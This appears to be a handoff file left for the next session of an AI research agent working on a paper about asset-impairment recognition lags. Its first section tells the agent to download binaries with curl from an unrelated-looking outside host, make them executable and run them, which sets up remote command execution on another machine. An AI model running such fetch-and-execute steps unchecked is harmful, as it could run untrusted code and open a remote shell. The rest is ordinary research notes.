---
project: wealth-tensor
gh_sha: 161e71bf593f87a6b9cb11084f38a838a037d22d
updated: 2026-08-12
session: wealthTensor-16
gate_passed: true
gate_version: "2.50"
---

# wealth-tensor — HANDOFF

*Overwritten every session. `git log -p docs/HANDOFF.md` is the archive. Run
`python3 scripts/handoff_gate.py --check` before trusting this file.*

## 0 · TRANSPORT — darlish, zero-bridge

```
curl -s https://system.europeanflorist.com/dsh/darlish-up -o /tmp/darlish-up && chmod +x /tmp/darlish-up && /tmp/darlish-up
```

Post the printed `DARLISH-ENROLL v1 id=… fp=…` line **exactly** as a comment on Asana task
`1217316841710435` via the session's Asana MCP, then run `/tmp/darlish-up` again to collect.
**Re-run before diagnosing.** First collect has now worked `-06` through `-16` without exception;
`-16` was READY in one cycle and the bridge rotated zero times all session.

```
curl -s https://system.europeanflorist.com/dsh/dx -o /tmp/dx && chmod +x /tmp/dx
/tmp/dx '~/Scripts/roster join --who big-wealthTensor-17 --task "<what you are doing>"'
/tmp/dx '~/Scripts/roster claim --who big-wealthTensor-17 --resource wealth-tensor'
```

`export LESSONS_CONTRIBUTOR=opus` **before any `lessons.py add`**.

**Never inline a multi-line commit message in a `dx '...'` argument.** `printf`/write to a local
file, `--put` it, `git commit -F`. Used twice this session, no incidents.

`dx --get` fails on binary — base64 both ways. Quote remote paths. Exit 3 = never reached darwin,
safe to re-run; exit 4 = started, check state first. **Use `./.venv/bin/python` for everything** —
`python3 -m pytest` dies at collection because scipy lives only in the venv. 199 tests, ~37s.

**The roster contention warning naming YOU is still noise.** Carded on State Machine
`1217420907841952`. Do not spend a turn on it.

### The editing tool that makes this project cheap — and the trap it did NOT spring this time

Anchor-counting Python patch scripts, never `sed`. Ten edit sites across two patches this session,
**two anchor failures, both caught and both trivial** (a trailing `.` inside a bold span, and a
whitespace-sensitive lambda). `dx --get` the manuscript to the container first and copy every anchor
out of the real text rather than composing it from memory.

**`-15`'s structural-delimiter trap is now MECHANISED and you no longer have to remember it.**
§4.9 is inserted before `## 5`, so its anchor necessarily runs through `---` and the `## 5` heading
to be unique — the exact shape that silently absorbed §6 into §5 last session. `scripts/patchkit.py`
now compares the document's skeleton before and after and **refuses the write**, having written
nothing, if any heading or horizontal rule is gained or lost undeclared:

```python
from patchkit import apply_edits
apply_edits(edits, expect_structure={"###": +1})    # one subsection added, declared
```

Undeclared changes raise `StructureError` naming the headings **LOST** and **GAINED**, because a
checksum cannot tell you which section vanished. Eight tests in `tests/test_patchkit_structure.py`
pin it, including the `-15` edit itself. **Use `apply_edits` rather than a hand-rolled
`src.count(old)` loop** — this session hand-rolled and then had to write the guard anyway.
15 `##` before and after this session; `###` went 27 → 28, the one section added.

### Run any EDGAR crawl in the CLOUD, not on darwin

`data.sec.gov` and `www.sec.gov` are both reachable from the Cowork container; darwin's disk is at
95%. But you almost certainly do not need to: `data/pre-002-events.json` (695 rows) and
`data/pre-002-riskset.json` are **committed**, and `wt090` reads only those plus two fitted
constants. **Check `.gitignore` before celebrating a committed artifact** — `data/` was ignored once
and is now narrowed to `data/.universes/`.

## 1 · WHAT HAPPENED — THE CLOSED FORM SURVIVES, AND IT SURVIVES AS A TRANSFORM

`REG-004` registered and pushed (**5160f51**) before a line of the instrument existed;
`scripts/wt090_age_dependent_alpha.py` — **14 severe · 0 definitional · 0 vacuous**;
**199 tests green (was 138)**; coach ratchet unchanged at **6**; concessive openers **0**; gate PASS.

`-15` measured α and, in the same fit, rejected the shape: discrete Weibull k̂ = 1.210
[1.135, 1.285]. **R = (1 − φ)δ/(α − δ) is derived by summing a geometric**, so §4.3's ranking,
§4.4's crossing and §4.4's domain all inherited whatever that assumption was doing. It was doing one
thing, and not the one the section leaned on.

> **R = (1 − φ)·( Π(1/(1 − δ)) − 1 )**,  Π(z) = **E**[z^T],  T ≥ 1 the recognition lag

The gap is the flow convolved with the lag's survival function, and the sum telescopes into the
lag's **generating function evaluated outside the unit disc** — a discrete moment generating
function, not a Laplace transform, which is exactly why it can fail to exist. At a geometric lag
Π(1/(1 − δ)) = α/(α − δ) and the published form returns verbatim, to **2 × 10⁻¹³**. An
age-structured simulation carrying the gap as ageing cohorts, no closed form in the loop, matches to
**2 × 10⁻¹³** against §4.3's published 2 × 10⁻⁴ transient bound, while **rejecting** the naive
substitution α ← 1/**E**[T] at ten times that bound. R(φ)/R(0) = (1 − φ) to **exactly zero**.

**What the constant hazard was holding up is the DOMAIN.** R is finite exactly when the lag's
generating function has radius of convergence above 1/(1 − δ) — a condition on the **tail**, not the
mean (Barlow, Marshall and Proschan, 1963, Thm 6.3, now cited). For a geometric that radius is
1/(1 − α) and it reads α > δ, §4.4's domain verbatim. At k̂ = 1.21 it is entire and **the condition
has no analogue**. Had the same fit returned k̂ < 1 there would be **no steady state at any positive
decay rate at all** — so [1.135, 1.285] is doing more than rejecting a null, and there is now a test
that says so by constructing the k = 0.75 case and watching it diverge.

**Ladders, all registered before the run, all exhaustive: N1 · M1 / M3 · C2 · D1 · E2 · S2.** The
shape correction is **0.67%** across §4.4's tabulated ladder and **43.9%** at a disclosed three-year
life — negligible where this paper's ladder sits, material where the filings sit. α_eff runs 0.437
to 0.476 per year across the disclosed rectangle, so it is **a function of δ and not a recalibrated
constant**. The two-root exchange of §4.2 is **not** repaired by age-dependence: an age-dependent
world sits 5 × 10⁻⁴ from its own constant-hazard match and exactly as far from that match's mirror —
which is forced by §4.2's own theorem rather than discovered, and the write-up says so.

### And ladder C found the thing the registration was not watching for

The **shape** moves the top-rung crossing by **0.13%**, 0.00755 → 0.00754. But §4.4's tabulated
Kendall τ is **−0.67 at the measured recognition rate**, not −1, **and that is true before any shape
correction is applied.** §4.4's own first-rung boundary δ₁ < αδ₀/(2α − δ₀) sits at 0.0214 at
α = 0.05 and at **0.0156** at α̂ = 0.408; the table assigns δ₁ = 0.020. The section's closing
sentence already said the measured rate is the one that applies while its table was still evaluated
at the calibration, and those cannot both stand. Repaired in two places, minimally, without
reopening the argument. **The general lesson is the one `-15` wrote down and this session collected
on: a number that moves for a reason you cannot name is reporting a structural fact you have not
found — and here the fact was one section downstream of where the search was pointed.**

## 2 · WHAT THE TESTS CAUGHT THAT NO RUN COULD HAVE

`Π` was summed with the term ratio evaluated as `S(a+1)/S(a)`. For a geometric past its own radius,
and for **any** decreasing-hazard lag, the survival function **underflows to 0.0 while the term is
still large**, and the loop read that as an exhausted tail and returned a **finite number for a
divergent sum**. No ladder was affected — the fitted shape converges in a few dozen terms and never
approaches underflow — but the defect would have fired on precisely the two cases the paper uses to
say what the condition *excludes*. It was found by two tests written to pin §4.9's claims, not to
hunt a bug: *the geometric transform diverges at 1.05 α*, and *a k < 1 fit would have had no steady
state at all*. **A guard that certifies convergence must be able to tell an exhausted tail from an
underflowed one.** Repair: carry the ratio in a closed form that cannot underflow, accumulate terms
multiplicatively, and refuse rather than return once a still-rising partial term passes 1e290.
Banked globally in `claude-blackbook`.

**And the severity witness contract cost the first run.** `check()`'s witness must return a
**falsy** value — the same *condition* re-evaluated in a false world, not the raw quantity. A
witness returning `got - want` is truthy for any non-zero difference and the run dies as a phantom
tag with the guard perfectly healthy. Keep the comparison inside the lambda. Banked project-scoped.

## 3 · JASON'S RULINGS THIS SESSION — DO NOT REOPEN

- **The `## References` provenance block STAYS AS IT IS.** Asked directly, ruled directly: it is the
  one methods-disclosure paragraph charter §3.3 allows, generously read, and the confessional tone
  is part of what makes the verification credible. `-15` left it rather than gutting it unilaterally
  and was right to; it is now settled and needs no further sessions spent on it.

## 4 · THE PAPERS

**Paper III** — `docs/papers/paper-III-dual-tensor/paper-III.md`, **2,433 lines** (was 2,249).
Numbering preserved: 15 `##`, `###` 27 → 28.

| § | what changed |
|---|---|
| **4.9 · NEW** | the general closed form, its three falsifiers, the tail condition, the magnitude table across disclosed lives, α_eff as a function, the crossing decomposition, and the exchange that survives |
| 4.4 | τ marked at **both** rates in the table paragraph, and the first-rung boundary given at the measured rate. **Two sentences. The argument was not reopened and §4.4 was not polished.** |
| 5.4 | now names whose discrete Weibull it fits — Nakagawa and Osaki (1975) — which it never did |
| 7 | **four rows added** |
| 9 · L4 | the constant-hazard concession **narrowed rather than hedged**: it now states what the rejection costs and points at §4.9 |
| abstract | the bare rejection of the constant hazard now carries its consequence |

**Bibliography, six entries added and one deliberately unmarked.** Barlow, Marshall and Proschan
(1963) ✓ — Theorem 6.3 quoted in the form used, and equation (6.2) noted as the same result in the
form a reader may find more familiar. Little (1961) ✓ — cited for what the stationary identity
*requires*, a constant arrival rate, which this model never has. Nakagawa and Osaki (1975) ✓.
Hayn and Hughes (2006) ✓ — the three-to-four-year lag and the ten-year tail, from the abstract.
Potepa and Thomas (2023) ✓⧗ — the closest existing treatment of impairment *timing*, cited for
being a covariate hazard with **no baseline shape**, which is the gap §5.4 occupies; working paper,
end page omitted rather than guessed. **Marshall and Proschan (1972) carries NO mark on purpose** —
the Berkeley Symposium volume was not consulted, the page range is omitted, and the entry says so.
§4.9 does not depend on it, since the direction it predicts is also measured directly.

## 5 · THE AT-BAT, RANKED

1. **IS THE LAG'S SHAPE IDENTIFIED FROM A REPORTED SERIES AT ALL?** This is `-16`'s tee-up and
   REG-004 §5's stopping rule sent it here rather than letting it pull the session. §4.2 says a
   reported series contains four numbers — two roots and two amplitudes — and the model has five
   parameters. **An age-dependent lag has more than two.** The series carries the whole convolution,
   so the question is not whether k is *another* parameter to lose but whether the extra structure
   is visible at all: an age-dependent world sits 5 × 10⁻⁴ from its best constant-hazard *match at
   α_eff*, and nobody has asked what the **best-fitting** constant hazard does, or whether k̂ is
   recoverable from a noiseless series, or what noise level buries it. If k is *not* identified, the
   §4.2 impossibility result gets materially stronger and §4.9's correction becomes something a
   reader can never apply from filings — which is a limitation worth stating precisely. If it *is*,
   there is a second observable in the series nobody has used. **Pure theory, no data. Register
   before deriving anything that could be reported as a result.**
2. **SEPARATE THE ECONOMIC COUPLING FROM ASC 360's SEQUENCING.** §5.4 establishes departure from
   diagonality at 2–4× and explicitly cannot say why: the recoverability screen is ordered before
   the goodwill test, so one trigger makes two charges by the standards rather than by the assets.
   The discriminator is the **triggering disclosure**, not the charge. New data, new registration,
   and it is the natural sequel to the only result Limitation 9 ever asked for. Unchanged from `-15`.
3. **PROPAGATE α̂ THROUGH §4.4's TABLE PROPERLY, OR RULE THAT THE TABLE IS DELIBERATELY AT THE
   CALIBRATION.** `-16` marked the τ in two places and stopped there, because §4.4 is under a
   standing no-polish order and the fix is a *taste* call about what the table is for. The table's
   R column is computed at α = 0.05 throughout; at α̂ = 0.408 the four values are 0.0159, 0.0206,
   0.0151, 0.0039. Either the table gains a second column and the prose stays, or the table is
   explicitly labelled as the calibration case. **Ask Jason. Do not decide it alone and do not
   rewrite the section around it.**
4. **THE σ-AND-LIFETIME RESULT still needs new data** — realised return volatility and disclosed
   useful lives are not in this sample, Companion C's severity dispersion by class has overlapping
   intervals, and proxying is the WT-038 error, a three-time payer. Unchanged from `-15`.

## 6 · DO NOT

- Do not read §5.4 as a rescue of PRE-001. REG-003 §7 ruled it out in writing before the number
  existed. Nothing in REG-004 touches it.
- Do not restore "PRE-001 was doomed by the φδ confound" — false; wt082, wt083, wt088 E7.
- Do not remove the Bateman, Nerlove or Beaver & Ryan concessions. Do not restore "global rather
  than local" to Kuan, the unordered-pair statement to Bellman & Åström, or the bias/lag DESIGN to
  Ryan (1995).
- Do not reopen Griliches (1967). Closed with evidence.
- Do not reopen the `## References` provenance block. **Ruled this session — §3 above.**
- **DO NOT POLISH §4.4, §5.4 OR §4.9.** §4.4 has now been rewritten whole twice and had three
  numbers changed. §4.9 is a day old and reports registered results.
- Do not quote a single "effective recognition rate". α_eff is a function of δ; any comparative
  static that holds it fixed while moving δ is using the wrong derivative, and §4.9 says so.
- Do not report "the share of the disclosed rectangle inside the model's domain" as a finding of
  REG-004. Under an entire generating function the complement is empty and the share is 100% by
  construction. REG-004 §3 struck it deliberately; it is not an oversight to be corrected.
- Do not hand Jason a ranked list of problems as the deliverable. Do not run a pure-teardown pass.
- Do not invoke Mayo or error-statistical philosophy as a warrant. Pragmatic justification.
- Do not ask Jason to submit anything. Never add a free parameter to absorb an objection.
- Do not rewrite or summarise the charter inside a handoff.
- Adding a section means DELETING conduct narration elsewhere, not refreshing `.coach-baseline.json`.
  `-16` added §4.9 (~100 lines), four ledger rows and six bibliography entries and stayed at **6**,
  because none of it narrates conduct. That is the mechanism working, not a loophole.
